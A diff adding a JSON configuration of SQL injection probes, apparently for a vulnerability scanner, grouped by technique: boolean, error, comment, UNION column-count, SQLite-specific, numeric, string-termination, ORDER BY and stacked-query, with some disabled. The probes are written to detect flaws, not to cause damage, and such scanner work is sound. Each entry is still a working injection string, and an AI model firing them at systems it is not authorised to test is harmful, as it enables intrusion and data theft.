@@ -1,0 +1,289 @@
+{
+  "boolean_based": {
+    "name": "Boolean-based SQL Injection",
+    "description": "Boolean condition probes used to detect differential application behavior.",
+    "category": "logic",
+    "enabled": false,
+    "probes": [
+      {
+        "name": "boolean_true",
+        "value": "' OR '1'='1' -- "
+      },
+      {
+        "name": "boolean_false",
+        "value": "' OR '1'='2' -- "
+      },
+      {
+        "name": "boolean_true_compact",
+        "value": "' OR 1=1 -- "
+      },
+      {
+        "name": "boolean_false_compact",
+        "value": "' OR 1=2 -- "
+      },
+      {
+        "name": "boolean_true_hash_style",
+        "value": "' OR 'a'='a' -- "
+      },
+      {
+        "name": "boolean_false_hash_style",
+        "value": "' OR 'a'='b' -- "
+      }
+    ]
+  },
+  "error_based": {
+    "name": "Error-based SQL Injection",
+    "description": "Malformed SQL input used to identify SQL parser or database error behavior.",
+    "category": "error",
+    "enabled": true,
+    "probes": [
+      {
+        "name": "single_quote",
+        "value": "'"
+      },
+      {
+        "name": "double_quote",
+        "value": "\""
+      },
+      {
+        "name": "double_single_quote",
+        "value": "''"
+      },
+      {
+        "name": "unclosed_string",
+        "value": "'test"
+      },
+      {
+        "name": "quote_comment",
+        "value": "' -- "
+      },
+      {
+        "name": "quote_parenthesis",
+        "value": "')"
+      },
+      {
+        "name": "double_parenthesis",
+        "value": "\")"
+      }
+    ]
+  },
+  "comment_based": {
+    "name": "SQL Comment Injection",
+    "description": "Comment termination probes used to determine whether attacker-controlled input can terminate the surrounding SQL expression.",
+    "category": "comment",
+    "enabled": true,
+    "probes": [
+      {
+        "name": "double_dash",
+        "value": "' -- "
+      },
+      {
+        "name": "double_dash_newline",
+        "value": "' -- \n"
+      },
+      {
+        "name": "hash_comment",
+        "value": "' #"
+      },
+      {
+        "name": "slash_comment",
+        "value": "' /*"
+      },
+      {
+        "name": "slash_comment_closed",
+        "value": "' /* */"
+      }
+    ]
+  },
+  "union_based": {
+    "name": "UNION-based SQL Injection",
+    "description": "Non-destructive UNION probes used to identify compatible SELECT column counts and UNION behavior.",
+    "category": "union",
+    "enabled": true,
+    "probes": [
+      {
+        "name": "union_1_null",
+        "value": "' UNION SELECT NULL-- "
+      },
+      {
+        "name": "union_2_null",
+        "value": "' UNION SELECT NULL,NULL-- "
+      },
+      {
+        "name": "union_3_null",
+        "value": "' UNION SELECT NULL,NULL,NULL-- "
+      },
+      {
+        "name": "union_4_null",
+        "value": "' UNION SELECT NULL,NULL,NULL,NULL-- "
+      },
+      {
+        "name": "union_5_null",
+        "value": "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- "
+      },
+      {
+        "name": "union_1_integer",
+        "value": "' UNION SELECT 1-- "
+      },
+      {
+        "name": "union_2_integer",
+        "value": "' UNION SELECT 1,2-- "
+      },
+      {
+        "name": "union_3_integer",
+        "value": "' UNION SELECT 1,2,3-- "
+      },
+      {
+        "name": "union_2_text",
+        "value": "' UNION SELECT 'a','b'-- "
+      },
+      {
+        "name": "union_3_mixed",
+        "value": "' UNION SELECT 1,'a',NULL-- "
+      }
+    ]
+  },
+  "sqlite_specific": {
+    "name": "SQLite-specific SQL Injection",
+    "description": "SQLite-compatible probes used to identify SQLite expression evaluation and database-specific behavior.",
+    "category": "sqlite",
+    "enabled": true,
+    "probes": [
+      {
+        "name": "sqlite_true",
+        "value": "' OR 1=1 -- "
+      },
+      {
+        "name": "sqlite_false",
+        "value": "' OR 1=0 -- "
+      },
+      {
+        "name": "sqlite_null",
+        "value": "' OR NULL -- "
+      },
+      {
+        "name": "sqlite_version",
+        "value": "' UNION SELECT sqlite_version()-- "
+      },
+      {
+        "name": "sqlite_hex",
+        "value": "' OR hex('a')='61' -- "
+      },
+      {
+        "name": "sqlite_length",
+        "value": "' OR length('test')=4 -- "
+      }
+    ]
+  },
+  "numeric_based": {
+    "name": "Numeric-context SQL Injection",
+    "description": "Arithmetic and boolean probes for parameters that may be inserted into numeric SQL expressions.",
+    "category": "numeric",
+    "enabled": true,
+    "probes": [
+      {
+        "name": "numeric_true",
+        "value": "1 OR 1=1"
+      },
+      {
+        "name": "numeric_false",
+        "value": "1 OR 1=2"
+      },
+      {
+        "name": "numeric_addition",
+        "value": "1+1"
+      },
+      {
+        "name": "numeric_parenthesis",
+        "value": "1)"
+      },
+      {
+        "name": "numeric_comment",
+        "value": "1 -- "
+      }
+    ]
+  },
+  "string_termination": {
+    "name": "String-context SQL Injection",
+    "description": "String termination and expression probes for parameters embedded inside SQL string literals.",
+    "category": "string",
+    "enabled": true,
+    "probes": [
+      {
+        "name": "string_true",
+        "value": "' OR 'x'='x' -- "
+      },
+      {
+        "name": "string_false",
+        "value": "' OR 'x'='y' -- "
+      },
+      {
+        "name": "string_and_true",
+        "value": "' AND 'x'='x' -- "
+      },
+      {
+        "name": "string_and_false",
+        "value": "' AND 'x'='y' -- "
+      },
+      {
+        "name": "string_close_parenthesis",
+        "value": "') OR ('x'='x' -- "
+      },
+      {
+        "name": "string_double_close_parenthesis",
+        "value": "')) OR (('x'='x' -- "
+      }
+    ]
+  },
+  "order_by_based": {
+    "name": "ORDER BY-based SQL Injection",
+    "description": "Non-destructive ordinal probes used to detect SQL expression contexts where ORDER BY positions are accepted.",
+    "category": "order",
+    "enabled": true,
+    "probes": [
+      {
+        "name": "order_1",
+        "value": "' ORDER BY 1-- "
+      },
+      {
+        "name": "order_2",
+        "value": "' ORDER BY 2-- "
+      },
+      {
+        "name": "order_3",
+        "value": "' ORDER BY 3-- "
+      },
+      {
+        "name": "order_4",
+        "value": "' ORDER BY 4-- "
+      },
+      {
+        "name": "order_5",
+        "value": "' ORDER BY 5-- "
+      }
+    ]
+  },
+  "stacked_query": {
+    "name": "Stacked Query Detection",
+    "description": "Conservative statement-boundary probes used to detect whether multiple SQL statements are accepted.",
+    "category": "stacked",
+    "enabled": false,
+    "probes": [
+      {
+        "name": "statement_boundary",
+        "value": "';"
+      },
+      {
+        "name": "statement_boundary_comment",
+        "value": "';-- "
+      }
+    ]
+  },
+  "time_based": {
+    "name": "Time-based SQL Injection",
+    "description": "Timing-oriented detection case. Disabled because SQLite does not provide a standard built-in delay primitive suitable for a generic safe timing probe.",
+    "category": "timing",
+    "enabled": false,
+    "probes": []
+  }
+}
